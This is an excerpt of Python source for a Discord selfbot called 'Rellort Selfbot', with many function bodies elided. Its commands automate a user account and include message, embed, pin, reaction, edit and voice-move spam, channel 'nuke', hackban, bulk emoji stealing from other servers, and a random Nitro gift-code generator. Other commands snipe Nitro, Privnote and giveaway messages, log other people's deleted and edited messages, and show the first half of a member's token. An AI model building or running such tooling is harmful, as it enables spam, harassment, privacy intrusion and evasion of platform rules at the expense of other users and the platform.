        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)

    else:
        embed=discord.Embed(title="Rellort Selfbot - Edit snipe", description=f"No edited messages to snipe", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
...
@Rellort.command(aliases=['idunban', 'unbanid'])
async def unban(ctx, userid="Nonexd"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if len(str(userid)) != 18:
        embed=discord.Embed(title="Rellort Selfbot - Unban Command", description=f"\nCommand usage : {prefix.strip()}unban [id]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)   
    else:
        ...
        try:
            ...
            user = await Rellort.fetch_user(int(userid))
...
@Rellort.command(aliases=['idban', 'hackban',"hakban","hacban"])
async def banid(ctx, userid="Nonexd",reason="None specified"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if len(str(userid)) != 18:
        embed=discord.Embed(title="Rellort Selfbot - Ban ID Command", description=f"\nCommand usage : {prefix.strip()}banid [id]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)   
    else:
        ...
        try:
            ...
            embed=discord.Embed(title="Rellort Selfbot - Ban Command", description=f"\nBanned {userid}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.message.edit(content="",embed=embed)   
...
async def kick(ctx, member : discord.Member,reason="None specified"):
    ...
    if member.id == ctx.author.id:
        embed=discord.Embed(title="Rellort Selfbot - Kick Command", description=f"\nTry {prefix.strip()}leave [server-id] instead!", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed) 
    else:
...
@Rellort.command(aliases=['av', 'pfp'])
...
@Rellort.command(aliases=['downloadav', 'downloadpfp'])
...
@Rellort.command(aliases=['emojibig', 'urlemoji', 'emojiurl'])
async def bigemoji(ctx, emoji: discord.Emoji):
    await ctx.message.edit(content=emoji.url)

@Rellort.command(aliases=['emojiadd', 'emadd', 'addem',"emojisteal","stealemoji"])
async def addemoji(ctx, emoji: discord.Emoji,*,nameofemoji=None):
    try:
        ...
        with open(f"./data/{nameofemoji}.jpeg", 'wb') as Rellort_file: #have a feeling this only works with jpegs so jpeg it is :)
            shutil.copyfileobj(response.raw, Rellort_file)

        with open(f"data/{nameofemoji}.jpeg", "rb") as f:
            image = f.read()
        await ctx.guild.create_custom_emoji(name = (nameofemoji), image = image)
        await asyncio.sleep(2) 
        guildemoji = discord.utils.get(Rellort.get_guild(ctx.guild.id).emojis, name=nameofemoji)
...
@Rellort.command(aliases=['getguildemoji', 'getguildemojis',"downloadguildemoji"])
async def downloadguildemojis(ctx, guildid=None):
    if guildid == None:
        ...
        emojiamount = 0
        emojilist = ""
        guildtostealfrom = Rellort.get_guild(int(guildid))
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title=f"Rellort Selfbot - Emoji stealing from {guildtostealfrom.name}", description=f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
        ...
        for emoji in guildtostealfrom.emojis:
            ...
            try:
                response = requests.get(emoji.url, stream=True)
                with open(f"./data/{emoji.name}.jpeg", 'wb') as Rellort_file: #have a feeling this only works with jpegs so jpeg it is :)
                    shutil.copyfileobj(response.raw, Rellort_file)
               ...
               # await ctx.guild.create_custom_emoji(name = (emoji.name), image = image)
                await asyncio.sleep(2) 
                guildemoji = discord.utils.get(Rellort.get_guild(ctx.guild.id).emojis, name=emoji.name)
...
@Rellort.command(aliases=['stealserveremojis', 'stealemojis',"emojissteal", 'stealguildsemojis',"stealserversemojis","guildemojisteal",'guildemojissteal'])
async def stealguildemoji(ctx, guildid=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Rellort Selfbot - Finished emoji stealing from {guildtostealfrom.name}", description=f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}\n{emojilist}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(embed=embed)

@Rellort.command(aliases=['embedsspam', 'spamembed', 'spamembeds'])
async def embedspam(ctx, count=5, *, desc="I forgot to specify the embed content"):
    await ctx.message.delete()
    if int(count) > 25:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - embed spam", description=f"{count} embeds is too much - do 25 or less", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.send(embed=embed)
    else:
        for i in range(int(count)):
            randcolor = random.randint(0x000000, 0xFFFFFF)
            embed=discord.Embed(title="Rellort Selfbot - embed spam", description=desc, color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.send(embed=embed)


@Rellort.command(aliases=['messagespam', 'spammessage', 'spammessages'])
async def spam(ctx, count=5, *, desc="I forgot to specify the content to spam"):
    await ctx.message.delete()
    if int(count) > 25:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - spam", description=f"{count} messages is too much - do 25 or less", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.send(embed=embed)
    else:
...
@Rellort.command(aliases=['pinspam', 'masspin'])
async def spampin(ctx, count=None):
    if count == None:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - Pin spam", description=f"You didn't specify the amount of pins to do.\n{prefix.strip()}spampin [amount]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
...
@Rellort.command(aliases=['shutdown', 'logoff',"close"])
async def logout(ctx):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Logging out", description=f"Logging out!", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)
    await Rellort.logout()

#@Rellort.command(aliases=['reboot'])
#async def restart(ctx):
#    randcolor = random.randint(0x000000, 0xFFFFFF)
#    embed=discord.Embed(title="Rellort Selfbot - Restarting", description=f"Restarting!", color=randcolor)
#    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
#    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
#    await ctx.message.edit(content="",embed=embed)
#    await Rellort.logout()
#    Rellort.run(token.strip(), bot=False)

#This command needs working on - if any developers wanna help out lemme know, I just don't know how to 'restart' it

@Rellort.command(aliases=['purge'])
async def clear(ctx, amount):
    deleted = 0

    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Message purger", description=f"Deleting messages", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    msg= await ctx.send(embed=embed)
    async for message in ctx.message.channel.history(limit=int(amount)).filter(
        lambda m: m.author == Rellort.user
    ).map(lambda m: m):
        try:
            if message != msg:
                await message.delete()
                deleted = deleted + 1
                #embed=discord.Embed(title="Rellort Selfbot - Message purger", description=f"Deleted {deleted} messages", color=randcolor)
                #embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                #embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Message purger", description=f"Finished.\nDeleted {deleted} messages", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await msg.edit(embed=embed,delete_after=3)

@Rellort.command(aliases=['nitrogen',"gennitro","nitrogenerator"])
async def nitro(ctx):
    code = "".join(random.choice(characters) for x in range(16))
    await ctx.send(f"https://discord.gift/{code}")

@Rellort.command(aliases=['purgemessage',"purgecontent","clearmessage"])
...
@Rellort.command(aliases=['reactspam', 'massreact'])
async def spamreact(ctx, count=None, reaction=None):
    await ctx.message.delete()
    if count == None or reaction == None:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - React spam", description=f"You didn't specify the amount of messages to react to or the reaction to use.\n{prefix.strip()}spamreact [amount]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
...
@Rellort.command(aliases=['editspam', 'massedit'])
async def spamedit(ctx, count=None,*, mesg=None):
    await ctx.message.delete()
    if count == None or mesg == None:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - Message edit spam", description=f"You didn't specify the amount of messages to edit or the content to edit the messages to.\n{prefix.strip()}spamedit [amount] [message]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        ...
        edited = 0
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - Message edit spam", description=f"Editing messages", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        msg= await ctx.send(embed=embed)
        async for message in ctx.channel.history(limit=int(count)):
            try:
                if message.author == Rellort.user:
                    if message != msg:
        ...
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - Message edit spam", description=f"Finished.\nEdited {edited} messages", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await msg.edit(embed=embed,delete_after=3)

@Rellort.command(aliases=['token', 'halftoken'])
async def tokenhalf(ctx, member: discord.Member):#
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Message edit spam", description=f"{member.name}'s Token Begins With : \n`{final[1:]}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

    #ik i can simplise lots of this code but I like things to be clear and this is my way of style :)
@Rellort.command(aliases=['deletedmessagelogger', 'deletedmessageslogger',"logdeleted","deletedlogger"])
async def logdeletedmessages(ctx,deletestatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Deleted message logger", description=f"Deleted message logger is now : `{deletedmessagelogger}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['editedmessagelogger', 'editedmessageslogger','editlog','logedit',"editlogger"])
async def logediteddmessages(ctx,editstatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Edited message logger", description=f"Edited message logger is now : `{editedmessagelogger}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)


@Rellort.command(aliases=['editmode', 'editall'])
async def edit(ctx,editstatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Edit mode", description=f"Edit mode is now : `{statusofediting}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)#

@Rellort.command(aliases=['harotalk', 'talkharo',"haro","cutetalk"])
async def talkcute(ctx,talkcuteyems=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Cute talk", description=f"Edit mode is now : `{talkingcuteyems}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['nitrosniper', 'snipenitro'])
async def nitrosnipe(ctx,snipestatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Nitro Sniper", description=f"Nitro sniper is now : `{nitrosniping}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['privnotesniper', 'snipeprivnote'])
async def privnotesnipe(ctx,snipestatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Privnote Sniper", description=f"Privnote sniper is now : `{privnotesniping}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['notificationson', 'notificationsoff',"notifs","notis","noti","alerts"])
async def notifications(ctx,notifstatushm=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Notifications", description=f"Notifications are now : `{notifsyems}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

bumpstatus = "off"
@Rellort.command(aliases=['autobump', 'bumpauto'])
...
levelstatus = "off"
@Rellort.command(aliases=['levelauto'])
...
@Rellort.command(aliases=['giveawaysniper', 'snipegiveaway',"snipegw","gwsniper"])
async def giveawaysnipe(ctx,snipestatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Giveaway Sniper", description=f"Giveaway sniper is now : `{giveawaysniping}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['friendbackup', 'serverbackup',"backupfriends","backupservers","backupfull","fullbackup"])
async def backup(ctx,snipestatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Backup", description=f"Backing up friends...", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)
    for frend in Rellort.user.friends:
        try:
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Backup", description=f"Saved `{friendssaved}` friends", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Backup", description=f"Saved `{friendssaved}` friends and `{serverssaved}` servers", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)
    ...
    for cha in Rellort.private_channels:
    ...
    f.close()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Backup", description=f"Saved `{friendssaved}` friends , `{serverssaved}` servers and `{groupssaved}` group chats.", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)
...
@Rellort.command(aliases=['pastebinsniper', 'snipepastebins',"pastesnipe","snipepaste","snipepastebin"])
async def pastebinsnipe(ctx,snipestatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Pastebin Sniper", description=f"Pastebin sniper is now : `{pastebinsniping}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['sniper', 'snipersettings',"settingsniper","sniperon","sniperoff"])
async def snipe(ctx):
    global nitrosniping
    global privnotesniping
    global giveawaysniping
...
async def idtoname(ctx, personsid: int):
    if len(str(personsid)) != 18:
        ...
        user = await Rellort.fetch_user(personsid)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - Id to username", description=f"ID [{str(personsid)}]  = `{user.name}#{user.discriminator}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/dKfTyqLt1jkqIfiMXj/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)


@Rellort.command(aliases=['movevcspam', 'spammove',"vcspammer"])
async def vcspam(ctx,channelone=None,channeltwo=None, personsid=None,amount=20):
    ...
    if channelone==None or channeltwo==None:
        ...
        for Rellort in range(int(amount)):
...
@Rellort.command(aliases=['asci','cooltext',])
...
@Rellort.command(aliases=['haste','paste'])
async def hastebin(ctx, *,paste=f"Format is {prefix.strip()}hastebin [text]"):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Hastebin Command", description=f"Here's your paste!\n{textlink}{endoflink}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/dKfTyqLt1jkqIfiMXj/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['channelnuke','nukechannel',])
async def nuke(ctx):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Channel Nuked", description=f"<#{new_chan.id}> - {new_chan.name} has been nuked", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/dKfTyqLt1jkqIfiMXj/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
...
async def on_message(ctx):
    ...
    if giveawaysniping == "on":
        ...
        if f'<@{Rellort.user.id}>' in str(ctx.content): #
            if ctx.author.id == 294882584201003009 or ctx.author.id == 673918978178940951 or ctx.author.id == 716967712844414996 or ctx.author.id == 582537632991543307 or ctx.author.id == 450017151323996173 or ctx.author.id == 574812330760863744:
                gwlog = open("Log/gwlog.txt","a")
                try:
    ...
    if notifsyems == "on":
        if str(Rellort.user.id) in str(ctx.content):
            toast = ToastNotifier()
            if ctx.guild != None:                                                                                       #i replace Rellort user.id with name just so its clearer if the message pure content is pinging u and u dont know about ids and stuff
                toast.show_toast(f"{Rellort.user.name} - You got mentioned in {ctx.guild.name}",f"{ctx.channel.name} : {ctx.content.replace(str(Rellort.user.id),Rellort.user.name)}",duration=2,icon_path=f"./data/{str(Rellort.user.id)}.ico")
                #


    if ctx.author.id == Rellort.user.id:
        messagessent += 1
...
#                print(e)
    ...
    await Rellort.process_commands(ctx)
...
async def on_message_edit(before,after):
    ...
    if editedmessagelogger == "on":
        if after.guild == None:
            if after.author.id != Rellort.user.id:
...
@Rellort.command(aliases=["shorten","urlshorten"])
async def tinyurl(ctx,link=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await ctx.message.delete()
    if link == None:
        embed=discord.Embed(title=f"Rellort Selfbot - Url shortener", description=f"You didn't supply a link - {prefix.strip()}tinyurl [link-here]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        message = await ctx.send(embed=embed)
    else:
        embed=discord.Embed(title=f"Rellort Selfbot - Shortening link", description=f"beep bop beep", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        message = await ctx.send(embed=embed)
        ...
        embed=discord.Embed(title=f"Rellort Selfbot - Url shortener", description=f"Link shortened : \n{shortened}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        message = await ctx.send(embed=embed)

@Rellort.command(aliases=['server',"joinserver","serverjoin"])
async def join(ctx,link=None):#
    await ctx.message.delete()
    if link == None:
        embed=discord.Embed(title=f"Rellort Selfbot - Server joiner", description=f"You didn't supply an invite - {prefix.strip()}join discord.gg/server", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.send(embed=embed)
    else:
        ...
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title=f"Rellort Selfbot - Server joiner", description=f"Joining server : `discord.gg/{link}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        message = await ctx.send(embed=embed)
        ...
        if joint == 200:
            ...
            embed=discord.Embed(title=f"Rellort Selfbot - Server joiner", description=f"Successfully joined : `discord.gg/{link}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            

        else:
            embed=discord.Embed(title=f"Rellort Selfbot - Server joiner", description=f"Error Joining : `discord.gg/{link}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await message.edit(embed=embed)

#join server command got my account disabled - need to look into it
@Rellort.command(aliases=['lserver',"leaveserver","serverleave"])
async def leave(ctx,servid=None):#
    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if servid == None:
            embed=discord.Embed(title=f"Rellort Selfbot - Server joiner", description=f"Supply a link - {prefix.strip()}leave [server-id] \n(fyi this server id is {ctx.guild.id})", color=randcolor) #yes - i could make it do it in the guild its done it but idk, feel like people might accidently not supply a userid or sum
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.send(embed=embed)
    else:
        ...
        embed=discord.Embed(title=f"Rellort Selfbot - Server Leaver", description=f"Leaving `{servid}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        message = await ctx.send(embed=embed)
        ...
        if leave.status_code == 204:
            ...
            embed=discord.Embed(title=f"Rellort Selfbot - Server Leaver", description=f"Success | Left Server : `{servid}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await message.edit(embed=embed)
            ...
            embed=discord.Embed(title=f"Rellort Selfbot - Server Leaver", description=f"Error | Error leaving server : `{servid}`\nMessage : {leave.text}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await message.edit(embed=embed)


@Rellort.command(aliases=["serverinformation","infoserver"])
async def serverinfo(ctx):
    await ctx.message.delete()

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Rellort Selfbot - Gathering info on {ctx.guild.name}", description="...", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    message = await ctx.send(embed=embed)
    await asyncio.sleep(1)
...
"""
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Rellort Selfbot - {ctx.guild.name}", description=info, color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await message.edit(embed=embed)

    
@Rellort.command(aliases=["whois","infouser"])
async def userinfo(ctx, member: discord.Member = None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - User info", description=f"Getting user info on {member.name}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    message = await ctx.send(embed=embed)
    await asyncio.sleep(2)
...
"""  
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Rellort Selfbot - {member.name}#{member.discriminator}", description=info, color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await message.edit(embed=embed)


@Rellort.command(aliases=['cleardms','dmsclear',])
async def dmclear(ctx):
    usersdone = 0
    totalmessage = 0
    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Message Clearer", description=f"Clearing all messages with all users", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    msg= await ctx.send(embed=embed)
    for channel in Rellort.private_channels:
        ...
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Rellort Selfbot - Message Clearer", description=f"Clearing all messages with all users\nUsers Done : {usersdone}\nTotal Messages Deleted : {totalmessage}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
...
async def joke(ctx):
    ...
    embed=discord.Embed(title="Rellort Selfbot - Joke requested", description=f"{setup}\n||{delivery}||", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['stickbugged'])
...
